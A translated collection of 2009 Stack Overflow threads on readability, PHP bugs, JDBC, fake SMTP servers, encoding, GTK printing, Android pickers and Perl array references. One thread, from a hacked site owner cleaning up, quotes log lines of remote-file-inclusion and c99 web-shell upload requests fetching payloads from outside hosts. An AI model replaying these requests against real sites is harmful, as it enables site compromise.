使用您编写的类和方法的人不必阅读您的代码即可了解如何使用它们。所以我认为应该记录什么是合法的输入和输出范围以及重要的不变量。例如，函数将指针作为参数。无论您如何为函数命名，提供 NULL 是否有效或 NULL 是否是有效的返回结果都不是很明显。通常，-1 和 0 用于表示某些东西，例如搜索未找到的对象或类似的东西。这应该记录在案。

除此之外，我认为记录代码的关键不是记录一个类或方法做了什么***或是***什么，而是记录它背后的***意图是什么。***

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-15T13:30:22.660

在你和你的同事之间有一个[编码约定。](http://en.wikipedia.org/wiki/Programming_style)从缩进开始，覆盖括号直到“大括号从哪里来：新行，同一行？”

在 Visual Studio 中，可以选择并修复此样式。它可以帮助您团队中的所有其他人阅读相同的代码。当您不必区分“空”编辑（样式更改）和实际编辑时，它还使版本控制系统中的历史跟踪变得更加容易。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-15T13:38:42.797

坚持在您正在编码的环境中使用的范例。

一个明显的例子是 .NET 中的方法使用 Pascal 案例，Java 中的骆驼案例。

不太明显的示例与使用与标准类库中使用的约定相同的约定有关。

这个目标有很多话要说。命名约定为人类传达了很多信息，而对编译器来说却很少。任何在一个环境中使用过使用另一种环境约定的 API 的人都会注意到外来代码有多么突出。

一致性是一个有价值的特性，它可以减少人类代码使用者的认知负担。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-19T15:23:18.400

避开代码垃圾。

[Edward Tufte有这个美丽而强大的](http://www.edwardtufte.com/tufte/)[图表垃圾](http://en.wikipedia.org/wiki/Chartjunk)概念，图表中的视觉元素会产生噪音而不是信息。通过以这种方式思考图表，我们可以制作更清晰的图表。

我认为同样的想法，应用于代码，给我们带来了更清晰的代码。示例包括`/* getFoo() gets the foo */`- 样式的注释、不必要的圆括号和大括号、过于具体的变量名称和匈牙利符号缺陷。

什么构成图表垃圾取决于团队、环境和项目——有些人喜欢疣；某些环境以使某些垃圾有用的方式呈现代码（`// end for`例如考虑大括号匹配和注释）；一些项目需要更广泛的注释以符合标准或全面记录 API。但是，当一个团队建立了 chartjunk 对其项目意味着什么的标准时，许多决策变得更加容易，并且其代码变得更加一致和更具可读性。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-15T22:16:36.140

所有回复（和问题）都基于这样的假设，即可读性完全是代码编写者的责任。如果你真的不想阅读代码并且你有一个现在放弃阅读列表（代码有异味），它匹配 99% 的可用代码并且你实际上甚至不想非常努力地思考某些代码在做什么，那么您将找不到任何可读的代码。

无论我们今天使用什么规则来使我们的代码更具可读性，在 10 年后都会显得过时和愚蠢。如果您真的想要更好的代码可读性，请阅读一些旧代码（考虑到当时的时尚，它必须在您拥有的速度和内存的 1000 倍的机器上运行），努力理解它并鼓励其他人做同样的事情。

# php - PHP 注入攻击 - 如何最好地清理混乱？

> ID：550879
> 
> 赞同：12
> 
> 时间：2009-02-15T13:36:19.777
> 
> 标签：php, code-injection

有时，我的共享托管环境会受到损害，因为我未能对已安装的应用程序组合进行修补。上周，这是因为安装了一个旧的且未使用的 PHP 应用程序，称为 Help Center Live。结果是服务器上的每个 PHP 文件（我有几个 Wordpress、Joomlas、SilverStripe 安装）都添加了代码，这些代码从其他站点中提取隐藏链接并将它们包含在我的页面中。在这种攻击之后，其他人报告说他们的网站被 Google 禁止了 - 幸运的是，我似乎很早就发现了它。我只是在从我的手机浏览到其中一个站点时才注意到它 - 该页面包含移动浏览器中包含的链接。

我在日志中发现了很多这样的攻击尝试：

62.149.18.193 - - [06/Feb/2009:14:52:45 +0000] "GET /support/module.php?module= HelpCenter//include/main.php?config [search_disp]=true&include_dir= [http:// /www.portlandonnuri.com/2008_web//technote7/data/photo/id2.txt](http://www.portlandonnuri.com/) ??? HTTP/1.1" 200 26"-""libwww-perl/5.814"

我立即删除了这个应用程序，并编写了一个脚本，从每个源文件中删除了有问题的 PHP 代码。我还发现该脚本创建了 HTML 文件，其中包含要包含的其他受感染站点的链接。我也删除了它们。现在我担心攻击者可能留下了我错过的其他东西 - 一个 PHP 文件，可以让他永久访问。文件日期在攻击中都被修改了，我找不到在相关时间段内更改的任何其他文件。为了确保我的服务器上没有后门，我是否遗漏了一些明显的东西？

编辑：我还搜索包含攻击代码的文本文件，就像上面的日志文件片段中显示的那样。我没有找到。

另一个编辑：如果你碰巧看到这篇文章是因为你发现自己处于同样的情况，也许这会对你有所帮助。在操作它们之前，我用它来备份我的所有 PHP 源文件：

```
find . -name *.php -exec tar -uvf ~/www/allphp.tar {} \; 
```

这是为了撤消攻击者所做的更改：

```
find . -name *.php -exec sed -i '/<?php \/\*\*\/eval(base64_decode(/d' {} \; 
```

不是火箭科学，但对于像我这样的偶尔的 Linux/Unix 用户来说也不是微不足道的:-)。

另一个编辑：我无法审核服务器上的每一行代码，但我可以搜索可疑数据。我搜索了所有出现的“eval”和“base64”，但没有找到任何看起来不合法的东西。然后我为“.ru”运行了一个 grep（因为肇事者似乎来自那里），你瞧，发现了一个叫做 c99 shell 的东西，我很快就把它删除了。

最终编辑：我发现了 c99 shell 是如何上传的——通过 Coppermine 照片库中的一个洞。

```
97.74.118.95 - - [03/Feb/2009:00:31:37 +0000] "POST 
    /pics/picEditor.php?img_dir=http://xakforum.altnet.ru/tmp_upload/files
    /c99shell.txt&CURRENT_PIC[filename]=/1.php HTTP/1.1" 404 - "-" "-"
97.74.118.95 - - [03/Feb/2009:00:32:24 +0000] "
    GET /pics/albums/1.php HTTP/1.1" 200 25352 "-" "-" 
```

顺便说一句，IP 地址是 Godaddy 托管的 IP。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-15T14:15:06.577

1.) 保留您用于这些应用程序的文件的存储库（例如 SVN 或类似的）

2.) 尽可能及时更新每个应用程序的安全更新（大多数都有 RSS 提要）

3.) 定期备份你的数据库

如果/当 !@#$ 击中粉丝时，您可以重新开始使用数据库的新副本并从 SVN 重新部署代码。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T14:25:42.200

组成系统后，您实际上只有两个选择：审核每个应用程序的每一行或重新安装所有内容。由于听起来这些都是开源或商业程序，因此您最好重新安装它们。确实没有更好的方法来确保您现在其中一个没有后门。

安全专家可能会建议您也完全重新安装操作系统，因为您无法确定某些代码没有滑入会影响操作系统的地方，但是如果您的权限设置正确，这可能是矫枉过正。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T15:33:20.743

我们每天将完整的目录列表、所有驱动器和文件夹制作成一个文本文件。

它帮助我们发现了哪些文件在过去被篡改过。

对您现在所处的位置没有多大帮助，但将来可能会有所帮助。

（不会阻止事情伪造他们的大小/修改日期，但会帮助整理那些不麻烦的事情）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-12-16T23:04:32.917

除了其他人所说的之外，您还可以安装一些入侵检测系统（例如[PHPIDS](https://phpids.org/)，它是开源的）。

# php - 奇怪的问题回显数组（PHP）

> ID：550881
> 
> 赞同：1
> 
> 时间：2009-02-15T13:38:01.830
> 
> 标签：php, xml, arrays

好的，所以我有以下代码。我正在尝试输出一些 xml，以便可以使用 jQuery 读取它，但无论出于何种原因，当我尝试将数组中的元素添加到变量时，它只是将变量变为 0。我做了一个 print_r()在阵列上，这是正常的。

**代码**

```
if ($content == "tables") {
    $result = mysql_query("show tables");
$xml = "<tables>";
    while ($row = mysql_fetch_assoc($result)) {
        print_r($row);
        echo "<br />";
        $xml += "<table>" . $row['Tables_in_blog'] . "</table>";
    }
    //header('Content-type: text/xml');
    echo $xml;
} 
```

**输出**

```
Array ( [Tables_in_blog] => post )
Array ( [Tables_in_blog] => posts )
0 
```

有谁知道它为什么会这样做？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-02-15T13:42:04.583

```
$xml += "<table>" . $row['Tables_in_blog'] . "</table>"; 
```

那就是犯人。尝试串联：

```
$xml .= "<table>" . $row['Tables_in_blog'] . "</table>"; 
```

您错误地使用`+=`而不是`.=`连接。这触发 PHP 将值转换为数字（导致`0`）并添加它们。

# java - 谁/什么实现了我可以直接使用的接口？

> ID：550884
> 
> 赞同：2
> 
> 时间：2009-02-15T13:39:12.763
> 
> 标签：java, interface

我在学习 JDBC 时遇到了几个接口 - Connection、Statement、ResultSet 等……

这是否意味着某些对我隐藏的类正在实现这些接口，并在我需要时提供它们的引用？这是因为它们需要根据我使用的驱动程序以不同的方式实现吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T13:47:14.647

是的你是对的。这些接口的实现可以在数据库 JDBC 驱动程序中找到。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T16:15:30.643

在 JDBC 驱动程序的特定情况下，您是正确的。各个驱动程序 jar 包含必要接口的实现。

在其他情况下，例如一个著名示例的[日历，您可以查看文档以](http://java.sun.com/j2se/1.5.0/docs/api/java/util/Calendar.html)*了解已知*的子接口和直接实现。当然，Sun 的文档只会列出核心 Java 库中存在的子接口和子类。[您可能会在Apache Commons](http://commons.apache.org/)等 3rd 方库或您自己的代码中找到许多其他实现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T13:47:54.523

> 这是因为它们需要根据我使用的驱动程序以不同的方式实现吗？

例如。出于多种原因，将代码编写到接口而不是实现（= 类，在这种情况下）是一般的最佳实践。您已经提到了其中之一：相关但不同的实现可以共享一个通用接口。另一点是，可以在后台更改一个特定的实现，而无需更改接口：假设驱动程序的下一个实现需要使用另一个类。实现现有接口就足够了。

现在想象一下，代码处理类类型而不是接口。现在，如果实现改变了，这些接口也需要改变。这意味着 API 的每个用户（包括您）也必须更改他们的代码！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T15:56:06.257

正如 Johannes 所说，实际的 DB 驱动程序实现了这些类。关键是您可以切换驱动程序而无需对代码进行任何实际更改。

# .net - 使用 .net 测试 SMTP

> ID：550887
> 
> 赞同：57
> 
> 时间：2009-02-15T13:40:47.767
> 
> 标签：.net, testing, smtp

我需要配置一个 SMTP 服务器来测试我的网站，该网站发送电子邮件（用于注册确认等）。

我实际上并不希望发送电子邮件，我只想确保我的代码是正确的。因此，例如，我希望能够检查电子邮件是否放置在队列文件夹中。

谁能推荐一个易于配置的 SMTP 服务器？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2009-02-15T14:00:11.793

还有[Papercut](https://github.com/jaben/papercut)，它是一个 SMTP 服务器，它将接收消息但不会将它们传递到任何地方（允许您确保它们被正确发送）。收到的消息在一个小的 GUI 中可见，并且也被写入一个目录。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2010-02-18T14:39:23.893

在 .NET 中，可以将 SmtpClient 配置为通过将电子邮件放在拾取目录中来发送电子邮件。

SmtpClient 的默认构造函数从 app.config 获取其设置，因此对于测试环境，我们可以如下配置它。

```
<configuration>
    <system.net>
        <mailSettings>
            <smtp deliveryMethod="specifiedPickupDirectory">
                <specifiedPickupDirectory pickupDirectoryLocation="path to a directory" />
            </smtp>
        </mailSettings>
    </system.net>
</configuration> 
```

MSDN 参考 - app.config mailSettings 元素[http://msdn.microsoft.com/en-us/library/w355a94k.aspx](http://msdn.microsoft.com/en-us/library/w355a94k.aspx)

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2009-11-02T22:44:32.113

smtp4dev[项目](http://smtp4dev.codeplex.com/)是另一个虚拟 SMTP 服务器。我喜欢它，因为它有一个漂亮、简单的 UI，可以记录消息并让您查看最近消息的内容。使用 C# 编写，带有 MSI 安装程序。源代码可用。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2010-02-18T15:44:53.213

对于那里的 .NET 家伙。保持简单。

我们正在研究这个问题，然后其中一位开发人员想起了一个允许您覆盖电子邮件发送方式的配置设置。

这将为每封电子邮件创建一个文件并保持不变。

```
<system.net>
    <mailSettings>
      <smtp deliveryMethod="SpecifiedPickupDirectory">
        <specifiedPickupDirectory pickupDirectoryLocation="\\SharedFolder\MailDrop\" />
      </smtp>      
    </mailSettings>
  </system.net> 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2009-02-15T13:53:36.457

我认为博客文章[A Simple SMTP Server Mock for .NET](http://geekswithblogs.net/imilovanovic/archive/2004/09/27/11783.aspx) 为您提供了您所需要的：一个 SMTP 服务器模拟

> SMTP 服务器模拟基本上是一个伪造的 SMTP 服务器，可用于对发送电子邮件的应用程序进行单元测试。

此外，[谷歌搜索 smtp 模拟服务器](http://www.google.com/search?name=f&hl=en&q=smtp+mock+server)将为您提供用于测试目的的 SMTP 服务器选择。喜欢：

*   [Dumbster](http://quintanasoft.com/dumbster) - Java 伪造的 SMTP 服务器
*   [nDumbster](http://ndumbster.sourceforge.net/default.html) - Dumbster 的 .NET 端口

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-15T13:57:50.287

另一种方法是围绕实现相同接口的 SmtpClient 创建一个包装器。然后在你的类中注入并使用包装器。在进行单元测试时，您可以替换一个对方法调用和响应有期望的模拟包装器。

**编辑**：需要包装器（至少对于 RhinoMocks），因为 SmtpClient 不是从接口派生的，也没有虚拟方法。如果您使用可以直接模拟没有虚拟方法的类的模拟框架，则可以跳过包装器并直接注入 SmtpClient 模拟。

```
public class SmtpClientWrapper
{
    private SmtpClient Client { get; set; }

    public SmtpClientWrapper( SmtpClient client )
    {
         this.Client = client;
    }

    public virtual void Send( MailMessage msg )
    {
         this.Client.Send( msg );
    }

    ...
}

public class MyClass
{
    private SmtpClientWrapper Client { get; set; }

    public MyClass( SmtpClientWrapper client )
    {
         this.Client = client;
    }

    public void DoSomethingAndNotify()
    {
         ...
         this.Client.Send( msg );
    }
} 
```

测试（使用 RhinoMocks）为：

```
public void DoSomethingAndNotifySendsAMessageTest()
{
     SmtpClientWrapper client = MockRepository.GenerateMock<SmtpClientWrapper>();
     client.Expect( c => c.Send( new MailMessage() ) ).IgnoreArguments();

     MyClass klass = new MyClass( client );

     klass.DoSomethingAndNotify();

     client.VerifyAllExpectations();
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2011-11-07T01:37:39.313

我使用[Antix SMTP Server For Developers](http://antix.co.uk/Projects/SMTP-Server-For-Developers)，它就像打开应用程序一样简单。它将消息存储在一个文件夹中，您可以使用 UI 查看它们。非常快速/简单的解决方案。我想在这里提一下。

另请参阅：[windows 的开发 smtp 服务器](https://stackoverflow.com/questions/1353439/development-smtp-server-for-windows)

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2011-07-22T07:50:58.713

我发现了这个 - [http://improve.dk/archive/2010/07/01/papercut-vs-smtp4dev-testing-mail-sending-locally.aspx](http://improve.dk/archive/2010/07/01/papercut-vs-smtp4dev-testing-mail-sending-locally.aspx)解释了如何使用 papercut 和 smtp4dev 这两个很好的工具

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2010-01-19T06:26:22.343

如果您在 Mac OS X 上，您可以使用[MockSMTP.app](http://mocksmtpapp.com)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-11-02T22:40:42.897

[DevNull SMTP 服务器](http://www.aboutmyip.com/AboutMyXApp/DevNullSmtp.jsp)记录有关客户端和 SMTP 服务器之间通信的所有详细信息。如果您试图诊断为什么您的发送代码不起作用，它看起来会很有用。

它是用 Java 编写的，并作为可执行 jar 部署。源代码似乎不可用。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2010-05-18T08:13:42.737

您也可以使用 netDumbster。

[http://netdumbster.codeplex.com/](http://netdumbster.codeplex.com/)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2012-05-31T14:52:19.820

如果你已经安装了 Python，你可以运行下面的代码来在控制台中运行一个调试 smtp 服务器，它将消息转储到标准输出：

sudo python -m smtpd -n -c DebuggingServer localhost:25

从这里抓到：http: [//muffinresearch.co.uk/archives/2010/10/15/fake-smtp-server-with-python/](http://muffinresearch.co.uk/archives/2010/10/15/fake-smtp-server-with-python/)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2010-12-01T04:39:43.607

请注意，tvanfosson 提出的 SmtpClientWrapper 类需要在其 Send 方法的声明中使用最重要的“virtual”关键字，否则您将回到尝试直接模拟 SmtpClient 的同一条船上。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2011-07-16T13:06:48.163

根据许多其他建议，我使用了很多免费工具：[http ://www.toolheap.com/test-mail-server-tool/](http://www.toolheap.com/test-mail-server-tool/)

不是真正的 TDD，但在手动测试中很有用，因为它可以在每封要发送的电子邮件中弹出一个 Outlook Express 窗口。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-11-03T08:49:36.700

还有我自己的[http://ssfd.codeplex.com/](http://ssfd.codeplex.com/)，它是一个开源 SMTP 模拟器。接收电子邮件并将其放入可通过任务图标访问的文件夹中

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2015-07-03T13:39:02.957

正如 Sean Carpenter 所指出的，[Papercut](http://papercut.codeplex.com/)是当地发展的强大解决方案。但是，如果您还运行一个登台或测试服务器，[mailtrap.io](http://mailtrap.io)总体上可能是一个更简单的解决方案，因为您可以对您的开发和登台环境使用相同的方法。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-08-10T10:48:41.827

您可以使用 Mailnest.io，因为它是一种经济实惠且非常有效的电子邮件测试工具。它还有一个无限使用的永久免费计划。

# php - 字符编码似乎适用于 MAMP 服务器，但不适用于 WAMP 服务器

> ID：550895
> 
> 赞同：1
> 
> 时间：2009-02-15T13:48:02.243
> 
> 标签：php, apache, wamp, url-encoding, utf

我一直在开发一个应该能够接受多种语言的标签和搜索查询的 Web 应用程序。这不是要求太多，是吗？

现在，在我的开发 MAMP 服务器上，一切都很好。我添加多语言标签，以我想要的任何语言搜索等。

另一方面，在生产 WAMP 服务器上，多语言字符会带来麻烦。甚至不是一直，只是某些时候，或者某些角色，我还不确定。

发生的情况是他们获得了额外的字符，然后他们的 URL 解码不正确。

两种环境都使用 PHP 5、MySQL 和 Apache。

我的猜测是我在某个地方设置错误。

有任何想法吗？

*   更新：我现在确定是特定的字母（例如希伯来语 ל,מ א）

*   更新：易于重现：总是相同的字母得到错误的编码。

*   内容类型是`text/html; charset=utf-8`

此外，我进一步指出：
我使用搜索字符串：**ליבני**
在结果页面上，我看到：

*   在地址栏中，搜索短语是正确的，正确的 url 编码。
*   在 HTML 本身中，我看到字符串“ **�_יבני** ”，即“ `%D7_%D7%99%D7%91%D7%A0%D7%99`”，这意味着**ל**已被编码为“ `%D7_`”，而不是`%D7%9C`应有的“”。

我真的不知道该往哪里走。
有任何想法吗？任何人？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T22:33:42.370

字符集是一个简单的概念。关于它们的令人困惑的事情是，必须正确完成多个级别。如果你在一个地方搞砸了，它通常会出现在一个完全不同的地方。

因此，对您的问题的略微居高临下但也是非常真实的答案是，您需要知道自己在做什么，而不是仅仅用棍子戳它直到看起来还不错。

我推荐以下阅读：

*   [http://www.nicknettleton.com/zine/php/php-utf-8-cheatsheet](http://www.nicknettleton.com/zine/php/php-utf-8-cheatsheet)
*   [http://www.phpwact.org/php/i18n/charsets](http://www.phpwact.org/php/i18n/charsets)
*   [http://www.joelonsoftware.com/articles/Unicode.html](http://www.joelonsoftware.com/articles/Unicode.html)
*   [http://kore-nordmann.de/blog/php_charset_encoding_FAQ.html](http://kore-nordmann.de/blog/php_charset_encoding_FAQ.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T13:55:08.827

我建议您使用 UTF-8 进行内部和外部编码。使用[`AddDefaultCharset`指令](http://httpd.apache.org/docs/2.2/mod/core.html#adddefaultcharset)告诉 Apache 你的默认编码：

```
AddDefaultCharset utf-8 
```

现在您只需要确保您的应用程序正确处理数据（请参阅[`default_charset`指令](http://docs.php.net/manual/en/ini.core.php#ini.default-charset)）。如果您使用 UTF-8 作为输出，客户端也应该将其用于进一步的请求（URL、表单数据）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-24T09:45:35.903

事实证明，问题出在 PHP 的 parse_url() 中。我猜在某些版本中，在某些平台上， parse_url() 不能正确处理 UTF 字符。它至少又出现在窗户[上一次](http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=14708)。

我现在能够解决它。

感谢大家的时间和关注，Omer。

# c - 在 C 中使用 GtkTreeView 打印窗口？

> ID：550900
> 
> 赞同：0
> 
> 时间：2009-02-15T13:52:24.713
> 
> 标签：c, printing, gtk

我的应用程序中有一些报告表示为带有 GtkTreeView 小部件从 GtkListStore 模型读取数据的窗口。这些报告很像 Excel 表格，包含一些常见的东西：列名、一些页眉和页脚文本、可能是小图像……

我应该使用/阅读/学习什么才能打印出来，记住我是使用 GTK+ 的 C 程序员，我希望代码可以移植到 Linux 和 Windows。

你能给我一些提示什么是最好的方法，也许可以放一些（伪或真实的）代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T14:13:42.480

这应该可以通过[libCairo 实现](http://cairographics.org/)，它支持许多[后端](http://cairographics.org/backends/)，例如 Windows GDI、PostScript 和 PDF。

当然，这不会产生打印对话框，但如果要打印的数据可以以所有重要格式自动计算，那应该不会很复杂。我认为 Mozilla Firefox 也可以使用 libCairo 进行打印。

# android - 在我的 Android 应用程序中从图片应用程序访问图片

> ID：550905
> 
> 赞同：45
> 
> 时间：2009-02-15T13:57:06.170
> 
> 标签：android, android-image

就像 iPhone 有一个 UIImagePickerController 让用户访问存储在设备上的图片一样，我们在 Android SDK 中是否也有类似的控件？

谢谢。

* * *

## 回答 #1

> 赞同：87
> 
> 时间：2009-02-15T16:26:31.740

您可以使用`startActivityForResult`, 传入一个描述您想要完成的操作的 Intent 以及要执行该操作的数据源。

幸运的是，Android 包含一个用于挑选东西的动作：`Intent.ACTION__PICK`和一个包含图片的数据源： `android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI`用于本地设备上的 `android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI`图像或 SD 卡上的图像。

调用`startActivityForResult`传递选择操作和您希望用户从中选择的图像，如下所示：

```
startActivityForResult(new Intent(Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI), SELECT_IMAGE); 
```

然后覆盖`onActivityResult`以侦听已做出选择的用户。

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  if (requestCode == SELECT_IMAGE)
    if (resultCode == Activity.RESULT_OK) {
      Uri selectedImage = data.getData();
      // TODO Do something with the select image URI
    } 
} 
```

获得图像 Uri 后，您可以使用它来访问图像并使用它做任何您需要做的事情。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2011-10-08T12:10:35.737

你也可以这样做：

```
Intent photoPickerIntent = new Intent(Intent.ACTION_PICK);
photoPickerIntent.setType("image/*");
startActivityForResult(photoPickerIntent, 1); 
```

这将在所有存储中挑选图像。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-30T13:46:31.573

只是对 Reto 给出的答案的更新。您可以这样做来缩放图像：

```
private String getPath(Uri uri) {
String[]  data = { MediaStore.Images.Media.DATA };
CursorLoader loader = new CursorLoader(context, uri, data, null, null, null);
Cursor cursor = loader.loadInBackground();
int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
cursor.moveToFirst();
return cursor.getString(column_index);
} 
```

# perl - 为什么不应该返回数组 ref？

> ID：550906
> 
> 赞同：12
> 
> 时间：2009-02-15T13:57:06.870
> 
> 标签：perl, arrays, reference

在[“从 Perl 子例程返回整个数组效率低下”](https://stackoverflow.com/questions/546175/is-returning-a-whole-array-from-a-perl-subroutine-inefficient)的问题中，如果不需要，两个人建议不要优化。作为一般规则，优化会增加复杂性，如果不需要，简单会更好。但是在这个特定的情况下，返回一个数组与一个数组引用，我看不出有任何增加的复杂性，我认为界面设计的一致性会更重要。因此，我几乎总是做类似的事情：

```
sub foo
{
   my($result) = [];

   #....build up the result array ref

   $result;
} 
```

有什么理由我不应该这样做，即使是很小的结果？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-02-15T21:13:32.687

如果数组引用与界面的其余部分不一致，则不应返回它。如果您使用的所有其他东西都返回列表而不是引用，请不要成为导致其他程序员记住异常的奇怪鸭子。

除非您有大量列表，否则这确实是一个微优化问题。如果这是您程序中的瓶颈，您应该很幸运。

就复杂性而言，引用和列表之间的差异远远低于复杂性规模，如果你的程序员正在努力解决这个问题，你就会遇到更大的问题。复杂的算法和工作流程很复杂，但这只是语法。

说了这么多，我倾向于让所有东西都返回引用，并使接口与之保持一致。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T14:07:17.907

不，除了“return $result;” 为了清楚起见。

我记得测试过它们的效率，小型阵列的性能差异很小。对于大型数组，返回引用要快得多。

对于小结果来说，这确实是一件方便的事情。你愿意这样做：

```
($foo,$bar) = barbaz(); 
```

或返回参考：

```
 $foobar = barbaz();
 $foobar->[0]; # $foo
 $foobar->[1]; # $bar 
```

返回引用的另一种方法：

```
($foo,$bar) = @{barbaz()}; 
```

作为一项规则，一旦你决定走哪条路，就为你的模块保留它，因为从一种方法切换到另一种方法会让人感到困惑。

我通常返回类似事物列表的数组引用，当响应由两到四个不同元素组成时返回一个数组。不仅如此，我还做了一个哈希，因为并不是所有的调用者都会关心所有的响应元素。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-19T08:37:54.280

我将从此处[的另一个问题中复制我的答案的相关部分。](https://stackoverflow.com/questions/546175/is-returning-a-whole-array-from-a-perl-subroutine-inefficient)

经常被忽视的第二个考虑因素是界面。返回的数组将如何使用？这很重要，因为在 Perl 中整个数组解引用有点糟糕。例如：

```
for my $info (@{ getInfo($some, $args) }) {
    ...
} 
```

太丑了 这要好得多。

```
for my $info ( getInfo($some, $args) ) {
    ...
} 
```

它还适用于映射和 grepping。

```
my @info = grep { ... } getInfo($some, $args); 
```

但是，如果您要挑选单个元素，则返回数组 ref 可能会很方便：

```
my $address = getInfo($some, $args)->[2]; 
```

这比：

```
my $address = (getInfo($some, $args))[2]; 
```

或者：

```
my @info = getInfo($some, $args);
my $address = $info[2]; 
```

但到那时，您应该质疑@info 是否真的是一个列表或哈希。

```
my $address = getInfo($some, $args)->{address}; 
```

与数组与数组引用不同，几乎没有理由选择返回哈希而不是哈希引用。哈希引用允许方便的速记，就像上面的代码一样。与数组与引用相反，它使迭代器的情况更简单，或者至少避免了中间人变量。

```
for my $key (keys %{some_func_that_returns_a_hash_ref}) {
    ...
} 
```

您不应该做的是`getInfo()`在标量上下文中返回一个数组 ref 并在列表上下文中返回一个数组。这混淆了标量上下文作为数组长度的传统使用，这会让用户感到惊讶。

我想补充一点，虽然让一切都始终如一地执行 X 是一个很好的经验法则，但在设计一个好的界面时它并不是最重要的。用它走得太远，你可以轻松地压制其他更重要的问题。

最后，我将插入我自己的模块[Method::Signatures](http://search.cpan.org/perldoc?Method::Signatures)，因为它为传入数组引用提供了一种折衷方案，而无需使用数组引用语法。

```
use Method::Signatures;

method foo(\@args) {
    print "@args";      # @args is not a copy
    push @args, 42;   # this alters the caller array
}

my @nums = (1,2,3);
Class->foo(\@nums);   # prints 1 2 3
print "@nums";        # prints 1 2 3 42 
```

这是通过[Data::Alias](http://search.cpan.org/perldoc?Data::Alias)的魔力完成的。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-06-25T11:26:23.483

~~由于没有人提到`wantarray`，我会:-)~~

我认为让调用者决定它想要结果的上下文是一个很好的做法。例如，在下面的代码中，您向 perl 询问调用子例程的上下文并决定返回什么。

```
sub get_things {
    my @things;
    ... # populate things
    return wantarray ? @things : \@things;
} 
```

然后

```
for my $thing ( get_things() ) {
    ...
} 
```

和

```
my @things = get_things(); 
```

由于列表上下文，可以正常工作，并且：

```
my $things = get_things(); 
```

将返回数组的引用。

有关`wantarray`您可能需要检查的更多信息`perldoc -f wantarray`。

**编辑：**我疏忽了其中提到的第一个答案，`wantarray`但我认为这个答案仍然有效，因为它使它更清晰一些。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-16T05:20:11.410

如果数组是在函数内部构造的，则没有理由返回数组；只需返回一个引用，因为调用者保证只会有它的一个副本（它是刚刚创建的）。

如果函数正在考虑一组全局数组并返回其中一个，那么如果调用者不修改它，则返回引用是可以接受的。如果调用者可能会修改数组，*而这是不希望*的，那么函数应该返回一个副本。

这确实是一个独特的 Perl 问题。在 Java 中，您总是返回一个引用，并且该函数通过最终确定数组及其包含的数据来防止修改数组（如果这是您的目标）。在 python 中，引用被返回并且没有办法阻止它们被修改；如果这很重要，则会返回对副本的引用。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-16T19:10:39.840

我只想评论关于处理数组引用而不是*列表*的笨拙语法的想法。正如布赖恩所说，如果系统的其余部分正在使用列表，你真的不应该这样做。在大多数情况下，这是一个不需要的优化。

但是，如果不是这样，并且您可以自由地创建自己的样式，那么可以使编码不那么臭的一件事就是使用[autobox](http://search.cpan.org/perldoc?autobox)。`autobox`将`SCALAR`,`ARRAY`和`HASH`(以及[其他](http://search.cpan.org/perldoc?autobox#OPTIONS)) 转换为“包”，以便您可以编码：

```
my ( $name, $number ) = $obj->get_arrayref()->items( 0, 1 ); 
```

而不是稍微笨拙的：

```
my ( $name, $number ) = @{ $obj->get_arrayref() }; 
```

通过编码这样的东西：

```
sub ARRAY::slice { 
    my $arr_ref = shift;
    my $length  = @$arr_ref;
    my @subs    = map { abs($_) < $length ? $_ : $_ < 0 ? 0 : $#$arr_ref } @_;
    given ( scalar @subs ) { 
        when ( 0 ) { return $arr_ref; }
        when ( 2 ) { return [ @{$arr_ref}[ $subs[0]..$subs[1] ] ]; }
        default    { return [ @{$arr_ref}[ @subs ] ]; }
    }
